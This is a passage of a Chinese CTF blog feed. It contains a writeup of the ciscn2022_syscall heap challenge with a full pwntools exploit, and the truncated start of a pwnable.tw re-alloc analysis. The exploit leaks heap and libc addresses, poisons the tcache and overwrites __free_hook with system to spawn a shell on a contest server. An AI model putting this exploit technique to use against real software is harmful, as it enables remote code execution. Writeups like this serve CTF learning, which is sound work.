尚未解决</h2>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/06/18/ciscn2022-syscall/",
            "url": "http://example.com/2022/06/18/ciscn2022-syscall/",
            "title": "ciscn2022_syscall",
            "date_published": "2022-06-18T13:15:41.000Z",
            "content_html": "<h1 id=\"ciscn2022_syscall\"><a class=\"markdownIt-Anchor\" href=\"#ciscn2022_syscall\">#</a> ciscn2022_syscall</h1>\n<p>程序的漏洞点在于 free 后不会清空 size 数组对应的数据，而且在同一个该位置再次申请一个 chunk 的时候，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( choice == <span class=\"number\">17</span> )                    <span class=\"comment\">// malloc</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      idx = (syscall)(<span class=\"number\">38929LL</span>, sub_E1B, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( idx &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">4</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (syscall)(<span class=\"number\">38929LL</span>, getheap_ptr, idx, <span class=\"number\">0LL</span>) )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      v2 = (syscall)(<span class=\"number\">38929LL</span>, strings, <span class=\"number\">5LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, printf_, v2, <span class=\"number\">5LL</span>);</span><br><span class=\"line\">      szie = (syscall)(<span class=\"number\">38929LL</span>, read_, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( szie &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( szie &gt; <span class=\"number\">40</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      v3 = (syscall)(<span class=\"number\">38929LL</span>, malloc_, szie, <span class=\"number\">0LL</span>);<span class=\"comment\">// malloc</span></span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, saveheap, idx, v3);</span><br><span class=\"line\">      v4 = (syscall)(<span class=\"number\">38929LL</span>, strings, <span class=\"number\">9LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, printf_, v4, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      v5 = szie;</span><br><span class=\"line\">      v6 = (syscall)(<span class=\"number\">38929LL</span>, getheap_ptr, idx, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      (syscall)(<span class=\"number\">0x1231</span>LL, v6, v5, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      v7 = (syscall)(<span class=\"number\">38929LL</span>, getheap_ptr, idx, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (syscall)(<span class=\"number\">38929LL</span>, sub_E62, v7, <span class=\"number\">0LL</span>) )<span class=\"comment\">// ke I\t\t\t\t\t//这里会检查我们输入的数据是否为DEADBEEF</span></span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">//如果是就会跳转，而下面则是记录这次我们申请的size</span></span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, read_context, idx, szie);</span><br><span class=\"line\">      v8 = (syscall)(<span class=\"number\">38929LL</span>, getheap_ptr, idx, <span class=\"number\">0LL</span>) &amp; <span class=\"number\">0xFFF</span>;</span><br><span class=\"line\">      v9 = (syscall)(<span class=\"number\">38929LL</span>, strings, <span class=\"number\">7LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, printf_, v9, v8);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">      </span><br><span class=\"line\">      </span><br></pre></td></tr></table></figure>\n<p>// 如果是就会跳转，而下面则是记录这次我们申请的 size，这里一旦跳转，size 数组不会被更改，可能存在溢出。如上一次我们在这个位置放的堆块，申请的 size 是 0x28, 下一次我们申请的是 0x10，数据为 DEADBEEF，这里的 size 依旧是 0x28，造成溢出。</p>\n<p>思路</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>\n<p>申请出来四个 chunk，size 数组都是为 0x28</p>\n<p>然后申请 4 个 0x10，数据为 DEADBEEF</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_add</span>():</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;17&#x27;</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x10</span>))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&#x27;content: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"string\">&#x27;DEADBEEF&#x27;</span>)) </span><br><span class=\"line\"></span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br></pre></td></tr></table></figure>\n<p>这里就会造成溢出。先后释放 2，1，两个 chunk 进入 tcache，并且 1 对应的 chunk 的 fd 指针指向 2，chunk0 只有 0x20。我们输出 chunk0，一共输出 0x28 字节，将 chunk1 的 fd 指针泄露出来，就完成了堆地址的泄露。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">heap_addr = u64(r.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n<p>接下来，我们修改 chunk3 的头部，将其 size 从 0x21 改为 largebin 的大小范围，free (3) 令其进入 unsortedbins，我们在申请时，不要覆盖掉原本的 bk 指针就可以泄露出 libc 的地址。</p>\n<p>这里 free (3) 要绕过检查，所以我们将伪造他的下一个 chunk 的 size。先后释放 2,1, 使 chunk1 的 fd 指向 chunk2，利用 chunk0 的溢出，修改 chnnk1 的 fd，使其指向我们的目标地址。将伪造的 chunk3 的下一个堆的头写为合法的大小。同时这个伪造的 chunk 的下一堆的 size 也要合法，但是我们只能写 0x28 字节，所以我们将第一个伪造成 0x11，</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new_add() <span class=\"comment\">#1 0x370</span></span><br><span class=\"line\"></span><br><span class=\"line\">new_add() <span class=\"comment\">#2 0x390</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x501</span>))</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">aimed_addr = heap_addr+<span class=\"number\">0x10</span>+<span class=\"number\">0x500</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0x21</span>)*<span class=\"number\">4</span>+p64(aimed_addr))</span><br><span class=\"line\">new_add()       <span class=\"comment\">#1  0x370</span></span><br><span class=\"line\"></span><br><span class=\"line\">new_add()    <span class=\"comment\">#20x8a0</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>))</span><br></pre></td></tr></table></figure>\n<p>现在 chunk3 就可以正常 free，绕过检查。我们从 unsortedbins 上申请一个 chunk，完成 libc 的泄露</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase = u64(r.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x3ec0d0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>\n<p>后面就是我们修改__free_hook 数据为 system 地址，触发 getshell</p>\n<p>同样的手法。chunk0 修改 chunk1 的 fd，只不过这次是先后释放 3，1，chunk1 原本指向 chunk3</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system = libcbase+ libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">free_hook = libcbase + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x21</span>)+p64(free_hook))</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(system))</span><br><span class=\"line\">pause()</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<p>getflag</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CDesktop%5Cciscn%5C%E5%8D%8A%E5%86%B3%E8%B5%9B%5C%E8%B5%9B%E9%A2%98%5C%E4%BA%8C%E8%BF%9B%E5%88%B6%5C1%5C1655218920143203%5CQQ%E5%9B%BE%E7%89%8720220618214051.png\" alt=\"QQ图片20220618214051\"></p>\n<p>完整 exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;172.16.9.42&#x27;</span>,<span class=\"number\">8083</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">sz,content</span>):</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;17&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>,<span class=\"built_in\">str</span>(sz))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&#x27;content: &#x27;</span>,content)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;addr: &#x27;</span>)</span><br><span class=\"line\">    offset = <span class=\"built_in\">int</span>(r.recv(<span class=\"number\">5</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> offset</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_add</span>():</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;17&#x27;</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x10</span>))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&#x27;content: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"string\">&#x27;DEADBEEF&#x27;</span>)) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;68&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;idx: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&#x27;content: &#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;51&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;idx: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&#x27;34&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&#x27;idx: &#x27;</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">heap_addr = u64(r.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"> </span><br><span class=\"line\">new_add() <span class=\"comment\">#1 0x370</span></span><br><span class=\"line\"></span><br><span class=\"line\">new_add() <span class=\"comment\">#2 0x390</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x501</span>))</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">aimed_addr = heap_addr+<span class=\"number\">0x10</span>+<span class=\"number\">0x500</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0x21</span>)*<span class=\"number\">4</span>+p64(aimed_addr))</span><br><span class=\"line\">new_add()       <span class=\"comment\">#1  0x370</span></span><br><span class=\"line\"></span><br><span class=\"line\">new_add()    <span class=\"comment\">#20x8a0</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>))</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase = u64(r.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x3ec0d0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">system = libcbase+ libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">free_hook = libcbase + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x21</span>)+p64(free_hook))</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(system))</span><br><span class=\"line\">pause()</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/05/13/pwnable-re-alloc/",
            "url": "http://example.com/2022/05/13/pwnable-re-alloc/",
            "title": "pwnable-re-alloc",
            "date_published": "2022-05-13T08:28:21.000Z",
            "content_html": "<h1 id=\"pwnabletw\"><a class=\"markdownIt-Anchor\" href=\"#pwnabletw\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL1B3bmFibGUudHc=\">Pwnable.tw</span> \tre-alloc</h1>\n<p>说明：因为没有合适的 glibc 资源（自已懒），这里只是进行了一个理论分析。</p>\n<h2 id=\"环境保护\"><a class=\"markdownIt-Anchor\" href=\"#环境保护\">#</a> 环境保护</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/re-alloc$ checksec --file=re-alloc</span><br><span class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span><br><span class=\"line\">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   83) Symbols\t  Yes\t1\t\t2\t\tre-alloc</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/re-alloc$ strings libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so | grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29.</span><br><span class=\"line\">&lt;https://bugs.launchpad.net/ubuntu/+<span class=\"built_in\">source</span>/glibc/+bugs&gt;.</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/re-alloc$ </span><br></pre></td></tr></table></figure>\n<p>2.29 的一个 glibc，这里要注意的就是对 tcache 一个保护机制，将 tcache_chunk 的包括指针指向了 tcache。没有 pie 的保护。</p>\n<p>而且 RELRO 没有全开，就意味着我们可以修改 got 表。只要我们有办法泄露出 libc。以及任意地址写。</p>\n<h2 id=\"代码分析\"><a class=\"markdownIt-Anchor\" href=\"#代码分析\">#</a> 代码分析</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(&amp;byte_402070);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$   1. Alloc               $&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$   2. Realloc             $&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$   3. Free                $&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$   4. Exit                $&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your choice: &quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>主要实现了增删，全局没有 malloc 